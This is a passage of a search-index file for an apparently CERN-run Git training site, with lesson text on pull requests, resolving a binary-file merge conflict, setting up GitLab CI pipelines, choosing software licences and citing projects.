very\nefficient way to truly collaborate on large projects.\n\nA Pull Request represents an atomic unit of work. You can open a Pull\nRequest for adding a certain feature, composed by several commits with work in\nprogresses, minor fixes, major bug fixes. When merged, the feature is finally\nthere and complete, available to every collaborator. You reduce the chance of\nhaving incomplete and/or buggy features in released versions of the code.\nWhen writing a Pull Request, you know that your code will be viewed by\nsomeone. This makes you more attentive to what other persons will think\nwhen they see it, making you a better collaborator.\nSometimes, good code is like wine (it has to age a little bit to taste\nbetter). Pull Requests might stay open for a while before being accepted,\ndo not be in a rush: having your code reviewed (sometimes by the most annoying\nand pickiest reviewer!) is a chance for improvement.\n\n Behave on Pull Request discussionsSome Pull Requests on large projects can get rather controversial. Bear in mind\nthat Pull Requests are about facilitating collaboration for a common goal, and -\nas in real life - try not to go on a rampage, at least not too quickly!\n\nAutomatic testing\nMerge requests can be configured to prevent changes from being merged into the\nmain branch of a repository if any of the project's builds or tests fail to run\ncorrectly. This is useful to try and ensure that the master branch always\ncontains a \"good\" version of the project. See the continuous integration\nlesson for details on how to set this up with GitLab, along with a list of\nservices that can be used with other git hosts.\n Key Points\n\"Forking\" means to create your private editable copy of a remote project on\nthe servers\n\"Cloning\" means to download locally a remote repository and/or its fork\n\"Pull/Merge Requests\" allow for discussing code and content before including\nit\nAutomatic testing on Pull/Merge Requests ensures better upstream code quality\n\n\nCC BY 4.0 - Original\ncontent\n"},"git/10-conflict.html":{"url":"git/10-conflict.html","title":"Conflicts","keywords":"","body":"Conflicts\n Learning Objectives\nExplain what conflicts are and when they can occur.\nResolve conflicts resulting from a merge.\n\n\nAs soon as people can work in parallel, it's likely someone's going to step on someone\nelse's toes.

Suppose Dracula takes a picture of Martian surface and\ncalls it mars.jpg.\nIf you do not have an image file of Mars available, you can create\na dummy binary file like this:\n$ head --bytes 1024 /dev/urandom > mars.jpg\n$ ls -lh mars.jpg\n\n-rw-r--r-- 1 vlad 57095 1.0K Mar  8 20:24 mars.jpg\nls shows us that this created a 1-kilobyte file.

So, instead of editing the image file, we must check out\nthe version we want to keep. Then we can add and commit this version.\nOn the key line above, Git has conveniently given us commit identifiers\nfor the two versions of mars.jpg. Our version is HEAD, and Wolfman's\nversion is 439dc8c0.... If we want to use our version, we can use\ngit checkout:\n$ git checkout HEAD mars.jpg\n$ git add mars.jpg\n$ git commit -m \"Use image of surface instead of sky\"\n\n[master 21032c3] Use image of surface instead of sky\nIf instead we want to use Wolfman's version, we can use git checkout with\nWolfman's commit identifier, 439dc8c0:\n$ git checkout 439dc8c0 mars.jpg\n$ git add mars.jpg\n$ git commit -m \"Use image of sky instead of surface\"\n\n[master da21b34] Use image of sky instead of surface\nWe can also keep both images. The catch is that we cannot keep them\nunder the same name. But, we can check out each version in succession\nand rename it, then add the renamed versions. First, check out each\nimage and rename it:\n$ git checkout HEAD mars.jpg\n$ git mv mars.jpg mars-surface.jpg\n$ git checkout 439dc8c0 mars.jpg\n$ mv mars.jpg mars-sky.jpg\n\nThen, remove the old mars.jpg and add the two new files:\n$ git rm mars.jpg\n$ git add mars-surface.jpg\n$ git add mars-sky.jpg\n$ git commit -m \"Use two images: surface and sky\"\n\n[master 94ae08c] Use two images: surface and sky\n 2 files changed, 0 insertions(+), 0 deletions(-)\n create mode 100644 mars-sky.jpg\n rename mars.jpg => mars-surface.jpg (100%)\nNow both images of Mars are checked into the repository, and mars.jpg\nno longer exists.\n\n A Typical Work SessionYou sit down at your computer to work on a shared project that is tracked in a\nremote Git repository.

These tasks typically involve running tests for software packages or\ndeploying changes. In fact, this very website is tested and automatically\nupdated using CI jobs. In addition to the conventional uses, some physicists use\nthis to automatically build LaTeX documents or parts of their analyses.\nSome examples of CI services are Travis CI,\nCircleCi, AppVeyor and\nGitLab CI. In this lesson we\nwill use GitLab CI and it is integrated into CERN's GitLab instance that allows\ncontinuous integration to be used for free for both private and public git\nrepositories without the need to sign up to additional services.\nIn order to start using GitLab CI you just need to commit a file in the main\ndirectory of your repository called .gitlab-ci.yml. This file is used to\nspecify a pipeline, which can be built up of any number of interconnected stages\nwith each job having it's own environment. A minimal example of this file is:\nmy_first_job:\n    image: gitlab-registry.cern.ch/ci-tools/ci-worker:cc7\n    script:\n        - python -c 'import this'\n        - echo \"My first CI produced file\" > output.txt\n        - ls\n\nThis creates a single job named my_first_job and the image: key defines a\ndocker image\nwhich is used the define the environment that is used to run the job. In this case we use an\nofficial CERN CentOS 7 image.\nThe script: key then defines one or more commands which are executed\nsequentially. If any of the command return a non-zero exit code the execution\nstops and the \"build\" is marked as failed.\nOnce this file is committed and pushed you can go to the GitLab web interface\nfor your planets repository and click on the tab for \"Pipelines\".\n\nHere you can see any recent pipelines, at first our pipeline is marked as\npending while it waits for a suitable machine, known in GitLab CI as a runner,\nto be available. CERN provides a collection of shared runners which are\navailable to all users and these are automatically enabled for all repositories.\nTypically a trivial job like this one will take a few minutes to run, which is\nalmost entirely spent setting up the environment prior to starting the actual\njob. Once your job is completed you should be able to see the output of the job\nby clicking on the status of the pipeline:\n\nFollowed by name of the job you are interested in:\n\nIf you scroll down the page you should then be able to see the output of the\nthree commands:\n\n Checking jobsIf you ever want to check on a job's progress the log file can also be examined\nwhile a job is running using the same method.\n\nSometimes it is useful to be able to store files that are produced during a\npipeline, such as the output.txt file we have produced. Currently the file is\nautomatically deleted when the job ends, however, the output files and\ndirectories can be automatically kept for up to 30 days using by defining them\nas an \"artefact\". Additionally artefacts can be used in later stages in a\npipeline by being marked as a dependency.\nOur first pipeline can be extended to produced a plot using python and then\ncompile a LaTeX document using this plot by modify .gitlab-ci.yml to contain:\nstages:\n    - first_stage\n    - second_stage\n\nmy_first_job:\n    stage: first_stage\n    image: gitlab-registry.cern.ch/ci-tools/ci-worker:cc7\n    script:\n        - python -c 'import this'\n        - echo \"My first CI produced file\" > output.txt\n        - ls\n    artifacts:\n        paths:\n            - \"*.txt\"\n\nmake_plot:\n    stage: first_stage\n    image: continuumio/anaconda3:latest\n    before_script:\n        # Matplotlib should use a backend that is suitable for CI\n        - 'echo \"backend : Agg\" > matplotlibrc'\n    script:\n        - mkdir -p plots/\n        - python make_plot.py\n    artifacts:\n        paths:\n            - plots/\n\nmake_document:\n    stage: second_stage\n    image: gitlab-registry.cern.ch/ci-tools/ci-worker:cc7\n    before_script:\n        - yum install -y texlive ghostscript latexmk\n    script:\n        - latexmk -pdf my_document.tex\n    dependencies:\n        - make_plot\n    artifacts:\n        paths:\n            - my_document.pdf\n\nEach keyword in the configuration does the following:\n\nstages: Used to specify the order in which to run each stage. Each job is\nthen assigned to a particular stage using the stage key. All jobs in a\nstage can be executed in parallel, while later jobs will wait until all jobs\nin the previous stage have completed successfully.\nimage: Defines a docker image which is used to provide the environment\n(i.e. what software is installed) for the job.\nbefore_script: One or more commands which are executed before starting\nthe main job. This is typically used for installing software and generally\nsetting up the environment.\nscript: One or more commands to be executed.\nartifacts: Used to store files and directories produced by the job.\ndependencies: Used to specify previous jobs which create artefacts that\nare required by this job. These are then placed into the job's environment at\nthe same path that they were originally created at.\n\nSee the GitLab CI documentation for a\nfull description of the CI configuration file.\nAgain commit and push the .gitlab-ci.yml file along with\nmake_plot.py and my_document.tex\nand wait for the pipeline to complete. In the sidebar on the right you are then\nbe able to download some or all of the build artefacts like so:\n\n Debugging errors in `.gitlab-ci.yml`Sometimes it can be difficult to understand errors in the configuration of a\npipeline.

Reusing creative works\nwithout a license is dangerous, because the copyright holders could\nsue you for copyright infringement.\nA license solves this problem by granting rights to others (the\nlicensees) that they would otherwise not have. What rights are being\ngranted under which conditions differs, often only slightly, from one\nlicense to another. In practice, a few licenses are by far the most\npopular, and choosealicense.com will\nhelp you find a common license that suits your needs.  Important\nconsiderations include:\n\nWhether you want to address patent rights.\nWhether you require people distributing derivative works to also\ndistribute their source code.\nWhether the content you are licensing is source code.\nWhether you want to license the code at all.\n\nChoosing a licence that is in common use makes life easier for\ncontributors and users, because they are more likely to already be\nfamiliar with the license and don't have to wade through a bunch of\njargon to decide if they're ok with it.  The Open Source\nInititative and Free Software\nFoundation both\nmaintain lists of licenses which are good choices.\nThis article provides an excellent overview of\nlicensing and licensing options from the perspective of scientists who\nalso write code.\n Licensing at CERNWhen developing software at CERN you should keep in mind the open grounds on\nwhich this international organization was constituted. CERN has a legal office\noffering counseling and guidelines for\nlicensing software and other kinds of materials: when in doubt do not hesitate\nto contact them for trustworthy advice.\n\nAt the end of the day what matters is that there is a clear statement\nas to what the license is. Also, the license is best chosen from the\nget-go, even if for a repository that is not public. Pushing off the\ndecision only makes it more complicated later, because each time a new\ncollaborator starts contributing, they, too, hold copyright and will\nthus need to be asked for approval once a license is chosen.\n Can I Use Open License?Find out whether you are allowed to apply an open license to your software.\nCan you do this unilaterally,\nor do you need permission from someone in your institution?\nIf so, who?\n\n What licenses have I already accepted?Many of the software tools we use on a daily basis (including in this workshop) are\nreleased as open-source software. Pick a project on GitHub from the list below, or\none of your own choosing. Find its license (usually in a file called LICENSE or\nCOPYING) and talk about how it restricts your use of the software. Is it one of\nthe licenses discussed in this session? How is it different?\n\nGit, the source-code management tool\nCPython, the standard implementation of the Python language\nJupyter, the project behind the web-based Python notebooks we'll be using\nEtherPad, a real-time collaborative editor\n\n\n Key Points\nPeople who incorporate GPL'd software into their own software must make their software also open under the GPL license; most other open licenses do not require this.\nThe Creative Commons family of licenses allow people to mix and match requirements and restrictions on attribution, creation of derivative works, further sharing, and commercialization.\nPeople who are not lawyers should not try to write licenses from scratch.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/14-citation.html":{"url":"git/14-citation.html","title":"Citation","keywords":"","body":"Citation\n Learning Objectives\nMake your work easy to cite\n\n\nYou may want to include a file called CITATION or CITATION.txt\nthat describes how to reference your project;\nthe one for Software\nCarpentry\nstates:\nTo reference Software Carpentry in publications, please cite both of the following:\n\nGreg Wilson: \"Software Carpentry: Getting Scientists to Write Better\nCode by Making Them More Productive\".
